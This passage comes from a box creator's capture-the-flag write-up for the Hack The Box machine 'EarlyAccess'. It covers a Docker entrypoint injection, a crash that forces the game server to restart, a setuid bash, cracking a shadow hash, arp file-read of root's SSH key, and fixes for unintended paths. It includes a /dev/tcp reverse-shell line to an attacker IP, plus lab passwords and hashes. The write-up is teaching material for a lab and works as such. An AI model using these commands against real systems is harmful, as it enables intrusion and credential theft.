game-tester@game-server:~$ ls -alh /
total 88K
drwxr-xr-x   1 root root 4.0K Feb  3 13:14 .
drwxr-xr-x   1 root root 4.0K Feb  3 13:14 ..
-rwxr-xr-x   1 root root    0 Feb  3 13:14 .dockerenv
drwxr-xr-x   1 root root 4.0K Jul 14  2021 bin
drwxr-xr-x   2 root root 4.0K Jul 10  2020 boot
drwxr-xr-x   5 root root  340 Feb  3 13:14 dev
drwxrwxr-t   2 root 1000 4.0K Feb  3 16:45 docker-entrypoint.d
-rwxr-xr--   1 root root  141 Aug 19 14:15 entrypoint.sh
drwxr-xr-x   1 root root 4.0K Feb  3 13:14 etc
drwxr-xr-x   1 root root 4.0K Jul 14  2021 home
[...]
```

Let us look at the `docker-entrypoint.d` directory and `entrypoint.sh` script.

```bash
game-tester@game-server:~$ ls -alh /docker-entrypoint.d/
total 12K
drwxrwxr-t 2 root 1000 4.0K Feb  3 16:45 .
drwxr-xr-x 1 root root 4.0K Feb  3 13:14 ..
-rwxr-xr-x 1 root root  100 Feb  3 16:45 node-server.sh
game-tester@game-server:~$ cat /entrypoint.sh 
#!/bin/bash
for ep in /docker-entrypoint.d/*; do
if [ -x "${ep}" ]; then
    echo "Running: ${ep}"
    "${ep}" &
  fi
done
tail -f /dev/null
```

Looking at the `docker-entrypoint.d` directory, it seems to match the directory on the host. We can check if it is actually mounted into the container by creating a file on the host and see if it shows up in the container. Furthermore, we see that the entrypoint script executes all scripts in the `/docker-entrypoint.d` directory upon startup.

```bash
drew@earlyaccess:/opt/docker-entrypoint.d$ touch test
game-tester@game-server:~$ ls -alh /docker-entrypoint.d/
total 12K
drwxrwxr-t 2 root 1000 4.0K Feb  3 16:46 .
drwxr-xr-x 1 root root 4.0K Feb  3 13:14 ..
-rwxr-xr-x 1 root root  100 Feb  3 16:46 node-server.sh
-rw-r--r-- 1 1000 1000    0 Feb  3 16:46 test
```

Seems like the `docker-entrypoint.d` directory is mounted into the docker-host. We can also see that this directory is cleaned up regularly.

```bash
game-tester@game-server:~$ ls -alh /docker-entrypoint.d/
total 12K
drwxrwxr-t 2 root 1000 4.0K Feb  3 16:47 .
drwxr-xr-x 1 root root 4.0K Feb  3 13:14 ..
-rwxr-xr-x 1 root root  100 Feb  3 16:47 node-server.sh
```

If are able to inject our script here and force the server to restart, we could gain code-execution as root within the container. The email talked about a game-crash forcing the server to restart. Let us find a way to crash the game next.

Let us look at all ports listening on the container:

```bash
game-tester@game-server:~$ ss -tnlp
State      Recv-Q Send-Q             Local Address:Port
LISTEN     0      128                            *:9999
LISTEN     0      128                            *:22
LISTEN     0      128                   127.0.0.11:44859
LISTEN     0      128                           :::22
```

We can assume that the node-js application is running on port `9999`. Let us try to curl it.

```bash
game-tester@game-server:/$ curl 127.0.0.1:9999
<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Rock v0.0.1</title>
    </head>
    <body>
        <div class="container">
            <div class="panel panel-default">
                <div class="panel-heading"><h1>Game version v0.0.1</h1></div>
                    <div class="panel-body">
                        <div class="card header">
                            <div class="card-header">
                                Test-environment for Game-dev
                            </div>
                            <div>
                                <h2>Choose option</h2>
                                <div>
                                    <a href="/autoplay"><img src="x" alt="autoplay"</a>
                                    <a href="/rock"><img src="x" alt="rock"></a> 
                                    <a href="/paper"><img src="x" alt="paper"></a>
                                    <a href="/scissors"><img src="x" alt="scissor"></a>
                                </div>
                                <h3>Result of last game:</h3>
                                
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </body>
```

Let us use SSH to create a SOCKS tunnel to browse the website.

#### Enumeration of game-application

First we setup the socks-tunnel.

```bash
root@void:~# ssh drew@earlyaccess.htb -D 1080
drew@earlyaccess.htb password: XeoNu86JTznxMCQuGHrGutF3Csq5
Linux earlyaccess 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Thu Feb  3 17:35:35 2022 from 10.10.14.10
drew@earlyaccess:~$
```

We can now access the application by running through the SOCKS-proxy running on SOCKS5://127.0.0.1:1080. To configure a SOCKS Proxy in burp have can go to Project options and enable the SOCKS proxy:

![Burp socks config](/assets/htb/EarlyAccess/burp-socks.png)

Now we can browse the host through burp.

![Game webpage](/assets/htb/EarlyAccess/node/index-webpage.png)

Seems like we got access to a test-environment of the game. Let us look around a bit.

The first option is `autoplay`. Click on the link, we get redirected here:

![Autoplay](/assets/htb/EarlyAccess/node/autoplay-webpage.png)

Seems like we can specify an amount of rounds and set verbosity.

![Autoplay non-verbose](/assets/htb/EarlyAccess/node/autoplay-res-v.png)

Running autoplay without verbosity, we get some stats about the games played.

![Autoplay verbose](/assets/htb/EarlyAccess/node/autoplay-res.png)

Running autoplay with verbosity set, we see the result of each round and the stats.

![Game](/assets/htb/EarlyAccess/node/game-webpage.png)

Clicking on any of the other links (`rock`, `paper`, `scissors`) prints out the result of the game (either: `win`, `loss` or `tie`).

Let us find the source-code next. If we remember back to the `node-server.sh` script, the source code should be located in the `/usr/src/app` directory.

#### Static code-analysis - server.js

Let us take a look at the  `/usr/src/app` directory.

```bash
game-tester@game-server:/usr/src/app$ ls -alh
total 48K
drwxrwxr-x  5 root root 4.0K Aug 18 12:31 .
drwxr-xr-x  1 root root 4.0K Aug 19 14:15 ..
drwxrwxr-x  2 root root 4.0K Aug 18 12:31 assets
drwxrwxr-x 68 root root 4.0K Aug 18 12:31 node_modules
-rw-rw-r--  1 root root  19K Aug 18 12:31 package-lock.json
-rw-rw-r--  1 root root  315 Aug 18 12:31 package.json
-rw-rw-r--  1 root root 2.8K Aug 18 12:31 server.js
drwxrwxr-x  2 root root 4.0K Aug 18 12:31 views
```

The `server.js` file contains the source-code of the node-js app.

```js
'use strict';

var express = require('express');
var ip = require('ip');

const PORT = 9999;
var rounds = 3;

// App
var app = express();
app.set('view engine', 'ejs');
app.use(express.urlencoded({ extended: true }));
```

In the beginning of the file, we have two imports: `express` and `ip`. Furthermore, two variables are set: `PORT` and `rounds`. Then the express-app is created and some options are set (rendering-engine and url-encoding).

```js
/**
 * https://stackoverflow.com/a/1527820
 * 
 * Returns a random integer between min (inclusive) and max (inclusive).
 * The value is no lower than min (or the next integer greater than min
 * if min isn't an integer) and no greater than max (or the next integer
 * lower than max if max isn't an integer).
 * Using Math.round() will give you a non-uniform distribution!
 */
function random(min, max) {
  min = Math.ceil(min);
  max = Math.floor(max);
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
```

Next, we have a function that generates a random integer in range min - max.

```js
/**
 * https://stackoverflow.com/a/11377331
 * 
 * Returns result of game (randomly determined)
 * 
 */
function play(player = -1)
{
  // Random numbers to determine win
  if (player == -1)
    player = random(1, 3);
  var computer = random(1, 3);
  
  if (player == computer) return 'tie';
  else if ((player - computer + 3) % 3 == 1) return 'win';
  else return 'loss';
}
```

Next we have the `play` function, which depending on input either randomly determines the move of the user, or takes the move as input. Then it calculates the result of the game. Looking further down, we can determine that `rock=1`, `paper=2` and `scissors=3`.

```js
app.get('/', (req, res) => {
  res.render('index');
});

app.get('/autoplay', (req,res) => {
  res.render('autoplay');
});

app.get('/rock', (req,res) => {
  res.render('index', {result:play(1)});
});

app.get('/paper', (req,res) => {
  res.render('index', {result:play(2)});
});

app.get('/scissors', (req,res) => {
  res.render('index', {result:play(3)});
});
```

Next we have five routes. The first two simply render a html page. The other three simply run `play` and return the result of the game to the index page.

```js
app.post('/autoplay', async function autoplay(req,res) {
  // Stop execution if not number
  if (isNaN(req.body.rounds))
  {
    res.sendStatus(500);
    return;
  }
  // Stop execution if too many rounds are specified (performance issues may occur otherwise)
  if (req.body.rounds > 100)
  {
    res.sendStatus(500);
    return;
  }

  rounds = req.body.rounds;

  res.write('<html><body>')
  res.write('<h1>Starting autoplay with ' + rounds + ' rounds</h1>');
  
  var counter = 0;
  var rounds_ = rounds;
  var wins = 0;
  var losses = 0;
  var ties = 0;

  while(rounds != 0)
  {
    counter++;
    var result = play();
    if(req.body.verbose)
    {
      res.write('<p><h3>Playing round: ' + counter + '</h3>\n');
      res.write('Outcome of round: ' + result + '</p>\n');
    }
    if (result == "win")
      wins++;
    else if(result == "loss")
      losses++;
    else
      ties++;
      
    // Decrease round
    rounds = rounds - 1;
  }
  rounds = rounds_;

  res.write('<h4>Stats:</h4>')
  res.write('<p>Wins: ' + wins + '</p>')
  res.write('<p>Losses: ' + losses + '</p>')
  res.write('<p>Ties: ' + ties + '</p>')
  res.write('<a href="/autoplay">Go back</a></body></html>')
  res.end()
});
```

Finally we have the `autoplay` function. The function first checks if the round-input is a valid number. Then it checks if the rounds exceed 100. If so it returns an error. According to the comment, this is done due to performance issues.

Then it runs a while-loop until rounds is `0`. In the while-loop a game is played and the result is outputted as HTML. Looking at this code, we can spot a way to cause an endless-loop:

As the application does not check for negative numbers, the while loop runs as long as the rounds is not zero and every run the rounds-counter is decreased.

If we would use for example `-1` as the amount of rounds, the while loop would run endlessly, which eventually crashes the server. As the healthcheck triggers once the server is not responding, we should be able to "crash" the server and force a reboot this way.

#### Gaining root in the game-server

In order to exploit the game-server, we first have to create an exploit script that should be executed upon boot. For this we can create a simple bash-script with a reverse-shell or if we are alone on the server make bash a setuid-binary.

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'
```

OR

```bash
chmod +s /bin/bash
```

As the cronjob clears out the directory regularly, we can use a simple endless loop in bash to make sure our exploit is not deleted.

```bash
drew@earlyaccess:/opt/docker-entrypoint.d$ while [ 1 -eq 1 ]; do echo 'chmod +s /bin/bash' > ex.sh; chmod +x ex.sh; sleep 1; done
```

Next, we have to crash the server.

A normal curl-request to the node-server would look like this:

```bash
root@void:~# proxychains -q curl 172.19.0.4:9999/autoplay -d 'rounds=1'
<html><body><h1>Starting autoplay with 1 rounds</h1><h4>Stats:</h4><p>Wins: 0</p><p>Losses: 1</p><p>Ties: 0</p><a href="/autoplay">Go back</a></body></html>
```

In order to crash the server we can simply send a negative amount of rounds:

```bash
game-tester@game-server:~$ curl 127.0.0.1:9999/autoplay -d 'rounds=-1'
Connection to 172.19.0.4 closed by remote host.
Connection to 172.19.0.4 closed.
drew@earlyaccess:~$
```

After sending the curl command, the server hangs for about 30 seconds and then closes the ssh-connection. After waiting a bit more, we can re-ssh into the machine and check if bash is now a setuid-binary.

```bash
drew@earlyaccess:~$ ssh game-tester@172.19.0.3
Linux game-server 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Feb  3 16:55:48 2022 from 172.19.0.1
-bash-4.4$
```

Due to how docker is handling containers, the container got assigned a new IP and is now available at 172.19.0.3. We can now ssh back into the container. We successfully changed bash to a setuid-binary and can now run arbitrary commands on the server as root. If we execute the bash binary using the `-p` flag our euid gets set to 0 (root).

```bash
-bash-4.4$ id
uid=1001(game-tester) gid=1001(game-tester) groups=1001(game-tester)
-bash-4.4$ /bin/bash -p
bash-4.4# id
uid=1001(game-tester) gid=1001(game-tester) euid=0(root) egid=0(root) groups=0(root),1001(game-tester)
```

Now that we are root let us read `/etc/shadow` to see if `game-adm` has a password set.

```bash
bash-4.4# cat /etc/shadow 
root:*:18758:0:99999:7:::
[...]
node:!:18759:0:99999:7:::
[...]
game-tester:!:18773:0:99999:7:::
game-adm:$6$zbRQg.JO7dBWcZ$DWEKGCPIilhzWjJ/N0WRp.FNArirqqzEMeHTaA8DAJjPdu8h52v0UZncJD8Df.0ncf6X2mjKYnH19RfGRneWX/:18822:0:99999:7:::
```

Seems like `game-adm` has a password set!

#### Cracking game-adm password hash

Let us copy the hash and try to crack it using john or hashcat.

```bash
root@void:~# cat hash.txt 
game-adm:$6$zbRQg.JO7dBWcZ$DWEKGCPIilhzWjJ/N0WRp.FNArirqqzEMeHTaA8DAJjPdu8h52v0UZncJD8Df.0ncf6X2mjKYnH19RfGRneWX/:18822:0:99999:7:::
```

#### Using john

```bash
root@void:~# john hash.txt -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
gamemaster       (game-adm)
1g 0:00:00:05 DONE (2022-02-03 12:06) 0.1785g/s 2422p/s 2422c/s 2422C/s 120806..sugar123
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

After only a couple of seconds we get the password of `game-adm`:`game-master`.

#### Using hashcat

```powershell
PS> .\hashcat64.exe -m 1800 .\hashes\game-adm.hash .\wl\rockyou.txt
hashcat (v5.1.0) starting...

======================================
* Device #1: GeForce GTX 1070, 2048/8192 MB allocatable, 15MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Dictionary cache hit:
* Filename..: .\wl\rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$6$zbRQg.JO7dBWcZ$DWEKGCPIilhzWjJ/N0WRp.FNArirqqzEMeHTaA8DAJjPdu8h52v0UZncJD8Df.0ncf6X2mjKYnH19RfGRneWX/:gamemaster

Session..........: hashcat
Status...........: Cracked
Hash.Type........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$zbRQg.JO7dBWcZ$DWEKGCPIilhzWjJ/N0WRp.FNArirqqzEM...RneWX/
Time.Started.....: Thu Feb 03 18:08:24 2022 (1 sec)
Time.Estimated...: Thu Feb 03 18:08:25 2022 (0 secs)
Guess.Base.......: File (.\wl\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    22073 H/s (8.65ms) @ Accel:64 Loops:32 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 30720/14344385 (0.21%)
Rejected.........: 0/30720 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
Candidates.#1....: 123456 -> *star*
Hardware.Mon.#1..: Temp: 56c Fan:  0% Util: 98% Core:2008MHz Mem:4104MHz Bus:16

Started: Thu Feb 03 18:07:55 2022
Stopped: Thu Feb 03 18:08:26 2022
```

We successfully crack the hash using hashcat after 27 seconds.

#### Getting shell as game-adm

Now that we have cracked the hash, we can su to `game-adm` on the host.

```bash
drew@earlyaccess:~$ su game-adm
Password: gamemaster
game-adm@earlyaccess:/home/drew$
```

### Privesc to root

Now that we successfully got a shell as game-adm, let us enumerate the system and find a privesc-vector to root.

#### Enumeration as game-adm

Let us take a look at the users group first.

```bash
game-adm@earlyaccess:~$ id
uid=1001(game-adm) gid=1001(game-adm) groups=1001(game-adm),4(adm)
```

Seems like the `game-adm` is part of the `adm` group. Let us run [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) on the server and see if we find more interesting information.

![LinPeas capabilities](/assets/htb/EarlyAccess/capabilities.png)

```bash
╔══════════╣ Readable files belonging to root and readable by me but not world readable                             
[...]
-rwxr-x--- 1 root adm 67512 Sep 24  2018 /usr/sbin/arp
```

LinPeas highlights that `/usr/sbin/arp` has `=ep` set. Furthermore, LinPeas shows us that we can execute `arp`.

Looking at [hacktricks blog](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities) about capabilities, we can find the special case of [empty capabilities](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#the-special-case-of-empty-capabilities). Essentially, empty capability (`=ep`) are equal to the `SUID`-bit set.

#### Exploiting arp to get arbitrary file-read

Now that we know that `arp` is effectively set to a suid binary, let us find a way to exploit it. Looking at [GTFOBins ARP](https://gtfobins.github.io/gtfobins/arp/), we find that it is possible get arbitrary file-read using arp. Using this we can read root.txt.

```bash
game-adm@earlyaccess:~$ /usr/sbin/arp -v -f /root/root.txt
>> 0b971***************************
arp: format error on line 1 of etherfile /root/root.txt !
```

We successfully exploit the empty capabilities of arp to read root.txt. We can also read root's id_rsa ssh-key to gain permanent access to the machine.

```bash
game-adm@earlyaccess:~$ /usr/sbin/arp -v -f /root/.ssh/id_rsa
>> -----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN: Unknown host
arp: cannot set entry on line 1 of etherfile /root/.ssh/id_rsa !
[....]
>> fD4WoE/0eunE1VUAAAAQcm9vdEBlYXJseWFjY2VzcwECAw==
arp: format error on line 26 of etherfile /root/.ssh/id_rsa !
>> -----END OPENSSH PRIVATE KEY-----
-----END: Unknown host
arp: cannot set entry on line 27 of etherfile /root/.ssh/id_rsa !
```

After re-formatting the input by hand (removing arp format error), we can use the ssh-key to login into the box.

```bash
root@void:~# ssh -i id_rsa root@earlyaccess.htb
Linux earlyaccess 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Sep  5 15:58:25 2021 from 10.10.14.6
root@earlyaccess:~#
```

## Bonus Content

### Directory traversal vulnerability as admin to leak magic_num

My friend firefart found an unintended solution, that I decided to keep, as it seemed fitting. As the admin can see all messages coming from the API after `DEBUG`, he can inject a directory traversal payload into the HTTP request that is forwarded to the API.

The API-requests done by the website looks like this: `http://api:5000/verify/<KEY>`.

If the admin would simply specify `.` following error is returned.

![Traversal as admin](/assets/htb/EarlyAccess/bonus/admin-key-traversal-1.png)

This occurs as the website issues following request to the API: `http://api:5000/verify/.` .

This vulnerability can be exploited using a simple traversal (`../`) to access other endpoints of the API:
`http://api:5000/verify/../` => `http://api:5000/`

![Traversal as admin](/assets/htb/EarlyAccess/bonus/admin-key-traversal.png)

When traversing one directory up, the hello message of the API is shown. The synchronization of the `magic_num` is mentioned here. If the user guesses correctly, he can leak the value of the `magic_num` by sending following game-key: `../magic_num`.

![Leak magic](/assets/htb/EarlyAccess/bonus/admin-key-leak-magic.png)

We successfully leaked the `magic_num` and can skip the brute-forcing steps. Furthermore, we found a new endpoint: `/check_db`. However, when trying to access we get an error, as it is protected by HTTP-Auth. The `/check_db` endpoint is relevant for a later exploit-step.

![Check_db invalid http auth](/assets/htb/EarlyAccess/bonus/admin-key-checkdb.png)

### Unintended paths that were fixed

Overall I am very happy with how the release of the box went. As I am not a professional web-developer I did make a couple of mistakes causing unintended paths that needed fixing later on. This section will display all the unintended paths that were found and fixed on the first couple of days after the release.

#### Laravel debug mode on

During the development-process I used the Laravel-debug mode to help me find issues with the application. On productive systems this debug mode is switched off. For some reason I forgot to make this part of the application production-ready and therefore left the debug mode activated. The debug-mode is defined in the .env file as follows:

```bash
root@void:~/EarlyAccess-dev/app/web/src# cat .env
APP_NAME=EarlyAccess
APP_ENV=local
APP_KEY=base64:V5Ew0xu2S2KTwdBqcfqVH5yhibpozjFEnRPTaSA1DmE=
APP_DEBUG=true
APP_URL=https://earlyaccess.htb

[...]
```

If a player was now able to cause an exception in the application, that I missed to catch, (there were a bunch of these :P ) the player would get access to detailed information.

![Laravel Exception](/assets/htb/EarlyAccess/bonus/laravel-debug-1.png)

![Admin Hash in debug](/assets/htb/EarlyAccess/bonus/laravel-debug-2.png)

Going through the debug information, it is possible that a player can get access to the password-hash of the admin. This allows them to skip the steps starting with the key-generation until attacking the dev-VHost.

#### Fix: Disabling Laravel-Debug and adding Exception Handling

Luckily this fix was both easy to develop and deploy. The only change necessary was to update the APP_DEBUG value in the .env file:

```bash
root@void:~/EarlyAccess-dev/app/web/src# cat .env
APP_NAME=EarlyAccess
APP_ENV=local
APP_KEY=base64:30nx5r2OKcnNV27+EBfuEdvqvizHcVlCb3LpRuOwUQQ=
APP_DEBUG=false
APP_URL=https://earlyaccess.htb

[...]
```

Furthermore, I implemented some further exception handling just in case.

#### Allowing the registration of the username "admin" and incorrect login checks

This vulnerability, which enabled Celesian and his team to get blood significantly faster than anyone else, was a stupid coding-mistake that I put in the code in an early stage of the web-development phase. Because usernames do not have to be unique anyone can register an account named "admin". This in theory is not an issue as the username "admin" should not be checked anywhere. However, in one part of the code I did!

As the administrator cannot add a key to his account, he would not be able to login into the game page (as a key is necessary to login). In order for the admin to still login I had following code in the login function:

```php
if ($name == "admin" || $key != "")
{
	// Store id & username in session
    $_SESSION['user'] = array();
    $_SESSION['user']['id'] = $id;
    $_SESSION['user']['name'] = $name;
    header('Location: /game.php');
}
else // No game-key registered
{
	throw new Exception("The account has no EarlyAccess-Key linked! Please link your game key to your account to continue.");
}
```

As username do not have to be unique, anyone could register and account with the username "admin" and skip everything from XSS to Game-key verification. That's what Celesian and his team did, allowing them to have a significant advantage over the other teams.

#### Fix: Disallowing registration of admin user and updated login-check

The fixes for this vulnerability were also created quite fast. I quickly updated the login-checks, removing the abilit for admins to login at all.

```php
if ($key != "")
{
    // Store id & username in session
    $_SESSION['user'] = array();
    $_SESSION['user']['id'] = $id;
    $_SESSION['user']['name'] = $name;
    header('Location: /game.php');
}
[...]
```

With this fix admins can no longer play the game, however in term of playing the box, this does not have any major impact.

At this point I wanted to be on the safe side, so I also disallowed the registration of the username "admin". For this I had to change the code of the Laravel-File that handles user-registration.

```php
$name = $input['name'];

if ($name === "admin")
{
	$name = "not_admin";
}
return User::create([
	'name' => $name,
	'email' => $input['email'],
	'password' => sha1($input['password']),
]);
```

This makes sure that the username `admin` is changed to `not_admin`. 

#### Cookie reuse

The second vulnerability exploited by Celesian and his team was a behavior in PHP that I was unaware of. As I said, I am not a professional web developer, so I was unaware that when using file-based sessions in PHP on two different subdomains with the same session name, the cookies would work on both subdomains. This may sound logical now, but at the time of development I had no idea that such behavior would occur. Since the session handling logic was identical on both VHosts, I simply copied the code, which led to this vulnerability. 

Once a player has access to the game VHost, they can reuse the cookie on the dev VHost, bypassing SQL injection. However, this is only a temporary benefit, as the admin password is still required in a later step of the box. This password must then be obtained either on the Docker host via MySQL or via the SQL injection from before.

#### Fix: Renaming the session-variable on the dev VHost

This fix was not deployed on the box, as it does not give the player any significant advantage. The player still needs to get the password from MySQL.

In order to fix the vulnerability, every occurrence of `$_SESSION['user']` has to be replaced with ` $_SESSION['admin']`.

#### Getting RCE using Log-Poisoning in LFI

I find it somewhat ironic that I of all people, who have exploited this weakness hundreds of times, couldn't manage to fix it properly. I implemented some filters to not allow log-poisoning, but as it turned out I forgot about: `file:///` (and probably some other wrappers.)

#### Fix: Hardcoding the intended lfi

I tried to keep the box as realistic as possible, but in this case I simply hardcoded the allowed strings to make sure the LFI is still possible but only to leak the PHP source-code.

### Easter-Eggs

During the development process I added a couple of small Easter-Eggs to the box.

#### Studio location - Schloss Schönbrunn

If you look at the About Us section of the page, you will find that the address of the game-studio EarlyAccess Studios is: Schönbrunner Schloßstraße 47, 1130 Vienna.

![Address of the studio](/assets/htb/EarlyAccess/bonus/studio-location.png)

If you lookup the [address](https://www.google.com/maps?saddr&daddr=Sch%C3%B6nbrunner+Schlo%C3%9Fstra%C3%9Fe+47,+1130+Wien), you will actually find that the studios are located in the [Palace Schönbrunn](https://en.wikipedia.org/wiki/Sch%C3%B6nbrunn_Palace), which was the main summer residence of the Habsburg rulers. I'd highly recommend visiting it and the garden, if you'd ever have the chance to be in Vienna.

#### Snake & rock-paper-scissors

When you read through the text of the website, you might have wondered what the mentioned game could look like. Not without reasion, as the game was praised in the highest tones on the website. One or two of you may have even laughed when you then (spoiler alert) found out that game mentioned is actually Snake. The second game encountered is also a very well-known classic: Rock-Paper-Scissors.

#### Leaderboard

You may have also wondered who the two players on the leaderboard are. Farbs and Firefart had a big impact on the development of the box and I wanted to keep them in the leaderboard as a little reminder/thank you.

#### Passwords

You may notice that the passwords chosen fit the theme of the box very well. I actually spent some time searching rockyou.txt for the appropriate password and I'm pretty happy with what I found. Once you had access to the admin area, it was game over for them. ;)

The fact that the game admin has chosen his password as gamemaster, also seems very appropriate to me.

### Inspiration and motivation

I don't want to go into too much detail about what inspired and motivated me to create this box, because I plan to write a separate blog post about it.
I have been a proud member of HTB for over 1000 days now (more than two and a half years) and have learned so much in that time. After spending so much time benefiting from what others have provided, I decided that I wanted to give back to the community!

### Special Thanks

Finally I'd like to thank my friends [Farbs](https://github.com/defarbs) and [Firefart](https://twitter.com/firefart), who had a major impact on the development on this box.

Without their constant feedback and motivation, the Box would not have turned out as good as it is. Two steps of the box (the RCE with the hash function and the health check in Root) were inspired by Firefart. Farbs was kind enough to design the Mamba logo (which turned out to be amazing!!!).

I also want to give a shoutout to [0xdf](https://twitter.com/0xdf_), who kept in touch with me during the entire development-phase of the box and also provided valuable feedback and insight during the testing and deployment-phase of the box.

### Final note

Thank you and congratulations if you have made it this far! I' m sure this took some time to read! xP

Anyway, thanks for sticking around. I hope you enjoyed the box and this writeup.
